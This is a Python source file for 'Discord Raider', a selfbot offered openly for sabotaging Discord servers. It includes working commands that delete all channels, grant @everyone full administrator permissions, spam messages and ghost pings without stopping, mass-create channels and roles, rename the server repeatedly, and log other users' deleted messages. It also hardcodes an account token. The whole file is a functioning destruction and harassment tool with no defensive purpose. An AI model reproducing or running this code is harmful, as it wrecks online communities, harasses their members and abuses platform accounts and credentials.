#    Copyright (C) 2019-2020 XxGamerBroskixX
#
#    This file is part of Discord Raider.
#
#    Discord Raider is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Discord Raider is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero Gene
# ral Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with Discord Raider.  If not, see <https://www.gnu.org/licenses/>.


import discord, asyncio, os, random, asyncio
from colorama import Fore, Style
from discord import Permissions


###############################Customization###############################
TOKEN = 'UXkgzWoIy4NXh6TayH6VCunI3x1zLhaS'
prefix = 'x!'
log_client_messages = True
anti_rate_limit = True
log_deleted_messages = True
channel_names = ["nuked","haha"]
role_names = ["Get Nuked","Haha"]
guild_names = ["Get Nuked","MAMPUSSS","we win"]
message_contents = ["@everyone get clowned on","@everyone we own you"]
game = discord.Game("Watching the Nukes Fall.")
###############################Customization###############################

class MyClient(discord.Client):
    async def on_connect(self):
      client.id = client.user.id
      client.email = client.user.email
      print(Fore.LIGHTYELLOW_EX + f"You're running this on Discord Verison {discord.__version__}")
      print(Fore.GREEN + 'Logged in as {}'.format
      (client.user.name))
      print(f"Your ID is {client.id}")
      print(f"Your email is {client.email}")
      print("My Github https://github.com/XxGamerBroskixX")
      print("Selfbot-V1.9 by XxGamerBroskixX")
      print("----------------------------------------------",Fore.RESET)
      await client.change_presence(status=discord.Status.online, activity=game)
        

    async def on_message(self,message):
      if message.author != client.user:
        return
      if message.content == (f"{prefix}ping"):
        await ping(self,message)
      elif message.content == (f"{prefix}mp"):
        await mp(self,message)
      elif message.content == (f"{prefix}spam"):
        await spam(self,message)
      elif message.content == (f"{prefix}help"):
        await help(self,message)
      elif message.content == (f"{prefix}spamall"):
        await spamall(self,message)
      elif message.content == (f"{prefix}delete"):
        await delete(self,message)
      elif message.content == (f"{prefix}channels"):
        await channels(self,message)
      elif message.content == (f"{prefix}gp"):
        await gp(self,message)
      elif message.content == (f"{prefix}gpr"):
        await gpr(self,message)
      elif message.content == (f"{prefix}nuke"):
        await nuke(self,message)
      elif message.content == (f"{prefix}logout"):
        await logout(self,message)
      elif message.content == (f"{prefix}roles"):
        await roles(self,message)
      elif message.content == (f"{prefix}admin"):
        await admin(self,message)
      elif message.content == (f"{prefix}namespam"):
        await namespam(self,message)
      elif message.content == (f"{prefix}guildinfo"):
        await guildinfo(self,message)

    async def on_message_delete(self,message):
      if message.author != client.user:
        if log_deleted_messages == True:
          channel = message.channel
          if isinstance(message.channel,discord.TextChannel):
            print(Fore.LIGHTYELLOW_EX + f"TEXT CHANNEL: Message",Fore.GREEN + f"{message.content}",Fore.LIGHTYELLOW_EX + f"has been deleted in {message.guild} in channel '#{message.channel}',",Fore.BLUE + f"by {message.author}",Fore.RESET)
          elif isinstance(message.channel,discord.GroupChannel):
            print(Fore.LIGHTYELLOW_EX + f"GROUP CHANNEL: Message",Fore.GREEN + f"{message.content}",Fore.LIGHTYELLOW_EX + f"has been deleted in '{message.channel}',",Fore.BLUE + f"by {message.author}",Fore.RESET)
          elif isinstance(message.channel,discord.DMChannel):
            print(Fore.LIGHTYELLOW_EX + f"DIRECT MESSAGES: Message",Fore.GREEN + f"{message.content}",Fore.LIGHTYELLOW_EX + f"has been deleted in '{channel.recipient}',",Fore.BLUE + f"by {message.author}",Fore.RESET)
            pass


async def help(self,message):
  await message.delete()
  color = discord.Color(0x00ff7e)
  author = message.author
  embed = discord.Embed(color=color, timestamp=message.created_at)
  embed.set_thumbnail(url=message.author.avatar_url)
   
  embed.add_field(name="Support me",value="https://github.com/XxGamerBroskixX/Discord-Raider")
  embed.set_author(name="Selfbot Commands", icon_url=message.author.avatar_url)
  embed.add_field(name=f"{prefix}help",value="Desplays this message.", inline=False)
  embed.add_field(name=f"{prefix}logout",value="Logs out of the bot.", inline=False)
  embed.add_field(name=f"{prefix}ping",value="Shows bots ping.", inline=False)
  embed.add_field(name=f"{prefix}mp",value="Mass message delete.", inline=False)
  embed.add_field(name=f"{prefix}spam",value="Spams in the channel the command is used in.", inline=False)
  embed.add_field(name=f"{prefix}gp",value="Ghost pings @everyone.", inline=False)
  embed.add_field(name=f"{prefix}gpr",value="Ghost pings roles.", inline=False)
  embed.add_field(name=f"{prefix}spamall",value="Spams in all channels.", inline=False)
  embed.add_field(name=f"{prefix}delete",value="Deletes all channels.", inline=False)
  embed.add_field(name=f"{prefix}channels",value="Makes random channels.", inline=False)
  embed.add_field(name=f"{prefix}nuke",value="Nukes the server.", inline=False)
  embed.add_field(name=f"{prefix}roles",value="Spam creates roles.", inline=False)
  embed.add_field(name=f"{prefix}namespam",value="Constantly changes the guild name.", inline=False)
  embed.add_field(name=f"{prefix}admin",value="Gives @everyone admin.", inline=False)
  embed.add_field(name=f"{prefix}guildinfo",value="Displays server info.", inline=False)

  embed.set_footer(text=f"Sent by {client.user}.",icon_url=message.author.avatar_url)
  await message.channel.send(embed=embed,delete_after=100)


async def mp(self,ctx,limit=None):
  await ctx.delete()
  channel = ctx.channel
  async for message in channel.history(limit=limit):
    if message.author.id == ctx.author.id and message.type == discord.MessageType.default:
      await message.delete()
      if log_client_messages == True:
        print(Fore.GREEN + f"Message '{message.content}'\nhas been deleted in {ctx.guild} by {client.user}",Fore.RESET)

  
async def channels(self,message,amount=500):
  await message.delete()
  guild = message.guild
  for i in range(amount):
    await guild.create_text_channel(random.choice(channel_names))

async def roles(self,message):
  await message.delete()
  guild = message.guild
  while True:
    await guild.create_role(name=(random.choice(role_names)))  
    
async def logout(self,message):
  await message.delete()
  await client.logout()
  print(f"{client.user} has logged out.")
                 
async def namespam(self,message, amount=999):
    await message.delete()
    for i in range(amount):
      while True:
        await message.guild.edit(name=(random.choice(guild_names)))    
    
async def guildinfo(self,message):
  await message.delete()
  color = discord.Color(0x00ff7e)
  guild = message.guild
  rolels = (len(guild.roles))
  emojils = (len(guild.emojis))
  channells = (len(guild.channels))
  embed = discord.Embed(color=color, timestamp=message.created_at)
  embed.set_thumbnail(url=f"{guild.icon_url}")

  embed.add_field(name="Guild Name",value=f"{guild.name}")
  embed.add_field(name="Guild ID",value=f"{guild.id}")
  embed.add_field(name="Member Count",value=f"{guild.member_count}")
  embed.add_field(name="Guild Owner",value=f"{guild.owner}")
  embed.add_field(name="Guild Region",value=f"{guild.region}")
  embed.add_field(name="Role Count",value=f"{rolels}")
  embed.add_field(name="Channel Count",value=f"{channells}")
  embed.add_field(name="Emoji Count",value=f"{emojils}")
  embed.add_field(name="Verification Level",value=f"{guild.verification_level}")
  embed.add_field(name="Creation Date",value=f"{guild.created_at}")
  embed.set_footer(text=f"Sent by {client.user}")

  await message.channel.send(embed=embed,delete_after=60)
    
    
async def nuke(self,message,amount=500):
  await message.delete()
  guild = message.guild
  for role in list(message.guild.roles):
    if role.name == "@everyone":
      try:
        await role.edit(permissions=Permissions.all())
        print(Fore.GREEN + f"Everyone has perms in {message.guild}")
      except:
        print(Fore.RED + f"Everyone does NOT have perms in {message.guild}",Fore.RESET)
  try:
    for channel in message.guild.channels:
      await channel.delete()
      print(Fore.GREEN + f"Channel {channel.name} has been deleted in {guild.name}")
  except:
    print(Fore.RED + f"Channel {channel.name} has NOT been deleted",Fore.RESET)
  try:
    await guild.edit(name=(random.choice(guild_names)))
  except:
    pass
  try:
    for i in range(amount):
      await guild.create_text_channel(random.choice(channel_names))
  except:
    pass                  

async def admin(self,message):
  await message.delete()
  for role in list(message.guild.roles):
    if role.name == "@everyone":
      try:
        await role.edit(permissions=Permissions.all())
        print(Fore.GREEN + f"Everyone has perms in {message.guild}")
      except:
        print(Fore.RED + f"Everyone does NOT have perms in {message.guild}",Fore.RESET)
                 
async def spam(self,message):
  await message.delete()
  while True:
    await message.channel.send(random.choice(message_contents))
    if anti_rate_limit == True:
      await asyncio.sleep(.2)

async def gp(self,message):
  await message.delete()
  while True:
    await message.channel.send("@everyone",delete_after=0.001)
    if anti_rate_limit == True:
      await asyncio.sleep(.2)

    
async def gpr(self,message):
  await message.delete()
  guild = message.guild
  while True:
    rolels = ('\n'.join(role.mention for role in guild.roles))
    await message.channel.send((f"@everyone \n" + f"{rolels}"),delete_after=10)
    if anti_rate_limit == True:
      await asyncio.sleep(.2)
     
   
async def delete(self,message):
  await message.delete()
  for channel in message.guild.channels:
    await channel.delete()


async def spamall(self,message):
  await message.delete()
  while True:
    for channel in message.guild.text_channels:
      await channel.send(random.choice(message_contents))
      if anti_rate_limit == True: 
        await asyncio.sleep(.2) 

async def ping(self,message):
    await message.delete()
    color = discord.Color(0x00ff7e)
    embed = discord.Embed(color=color, timestamp=message.created_at)
    embed.add_field(name="Bot Ping",value=f"The latency is {round(client.latency *1000)}ms.", inline=False)

    await message.channel.send(embed=embed,delete_after=15)


client = MyClient()
client.run((TOKEN))

